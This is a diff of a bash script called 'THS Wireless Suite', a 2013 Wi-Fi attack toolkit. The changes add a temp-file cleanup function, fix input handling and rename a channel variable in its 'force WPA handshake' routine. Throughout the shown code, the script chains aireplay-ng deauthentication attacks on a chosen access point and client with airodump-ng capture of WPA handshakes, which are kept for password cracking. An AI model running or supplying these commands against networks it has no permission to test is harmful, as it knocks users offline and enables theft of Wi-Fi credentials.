@@ -2,7 +2,7 @@
 #THS Wireless Suite
 #thsuite.sh v0.1
 #By TAPE
-#Last edit 12-08-2013 15:30
+#Last edit 12-08-2013 16:30
 #Written, and intended for use on CR4CK3RB0X -- THS-OS v3
 #Tested with success on Kali Linux
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -73,6 +73,20 @@ Written for the THS crew for use on THS-OS
 By TAPE" 
 f_exit
 }
+#
+##
+### MAKE SURE NO TEMP FILES REMAINING BEFORE START FUNCTION
+###########################################################
+f_clean() { 
+if [ -e /root/THS_TMP/handshake_list.tmp ] ; then rm /root/THS_TMP/handshake_list.tmp
+elif [ -e /root/THS_TMP/pyrit_cap_analyze.tmp ] ; then rm /root/THS_TMP/pyrit_cap_analyze.tmp
+elif [ -e /root/THS_TMP/csvfile_ap.tmp ] ; then rm /root/THS_TMP/csvfile_ap.tmp
+elif [ -e /root/THS_TMP/csvfile_cl.tmp ] ; then rm /root/THS_TMP/csvfile_cl.tmp
+elif [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp*
+elif [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp
+elif [ -e /root/THS_TMP/ssid_list.tmp ] ; then rm /root/THS_TMP/ssid_list.tmp
+fi
+} 
 #
 ##
 ### IFACE EXIST CHECK
@@ -328,6 +342,7 @@ done
 	sleep 1
 	iwconfig $IFACE txpower $PSET
 	sleep 1
+	ifconfig $IFACE up
 	f_iface
 	fi
 fi
@@ -836,6 +851,7 @@ f_list_wireless
 f_force_wpa() {
 clear
 f_header
+f_clean
 echo $BLU">$STD Forcefully acquire WPA handshakes$STD"
 f_exist
 f_mon_check
@@ -999,7 +1015,7 @@ f_menu
 ############################
 f_scan_assist_wpa() {
 DATE=$(date +"%Y%m%d-%H%M")
-FILEOUT='"$TARGET_AP$DATE".cap'
+FILEOUT="$TARGET_AP$DATE".cap
 echo  -ne $GRN">$STD Enter channel to scan on (Hit Enter for all channels): $GRN"
 read CHAN
 	if [[ "$CHAN" == "" || "$CHAN" == *,* ]] ; then 
@@ -1044,28 +1060,18 @@ echo $STD
 echo -e $BLUN"##\tAP BSSID\t\tASSOCIATED CLIENT\tESSID"
 echo -e $STD"--\t-----------------\t-----------------\t-----"
 cat /root/THS_TMP/scan_assist.tmp | sed '/./=' | sed '/./N;s/\n/ /' | sed 's/ /\t/g'
-#
-#
+MAXNR=$(cat /root/THS_TMP/scan_assist.tmp | wc -l)
 echo $STD
+#
+#
 echo -ne $GRN">$STD Choose network # from list to attempt forcing a handshake: $GRN"
 read LISTNR
-MAXNR=$(cat /root/THS_TMP/scan_assist.tmp | wc -l)
-if [ "$LISTNR" == "" ] ; then
-	if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp*
-	elif [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp
-	f_force_wpa
-	fi
-fi
-	while [[ ! "$LISTNR" =~ ^[1-$MAXNR]$ ]] ; do
+if [ "$LISTNR" == "" ] ; then f_force_wpa ; fi
+	while [[ ! "$LISTNR" =~ [1-$MAXNR] ]] ; do
+	if [ "$LISTNR" == "" ] ; then f_force_wpa ; fi
 	echo $RED">$STD Input error $RED[$STD$LISTNR$RED]$STD Entry not in list"
 	echo -ne $GRN">$STD Choose network # from list to attempt forcing a handshake: $GRN"
 	read LISTNR
-	if [ "$LISTNR" == "" ] ; then 
-		if [ -e /root/THS_TMP/wpa_temp-01.cap ] ; then rm /root/THS_TMP/wpa_temp*
-		elif [ -e /root/THS_TMP/scan_assist.tmp ] ; then rm /root/THS_TMP/scan_assist.tmp
-		f_force_wpa
-		fi
-	fi
 	done
 echo -n $GRN">$STD Use same interface to send deauth packets? Y/n "$GRN
 read SEND
@@ -1104,14 +1110,14 @@ read DIFACE
 	fi 
 #
 TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
-CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
+TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
 TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
 #
 echo $GRN">$STD Attempting to force & capture handshake"
 NAME=$(echo $TARGET_AP | sed 's/:/-/g')
 FILENAME="HANDSHAKE-$NAME"
 sleep 4 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
-& timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
+& timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
 #
 echo $GRN">$STD Deauth attempt on target AP complete"
 sleep 1
@@ -1119,14 +1125,14 @@ sleep 1
 else
 #Using same interface for scanning and deauthing
 TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
-CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
+TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
 TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
 #
 echo $GRN">$STD Attempting to force & capture handshake"
 NAME=$(echo $TARGET_AP | sed 's/:/-/g')
 FILENAME="HANDSHAKE-$NAME"
 sleep 4 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
-& timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
+& timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w $SAVEDIR$FILENAME
 #
 echo $GRN">$STD Deauth attempt on target AP complete"
 sleep 1
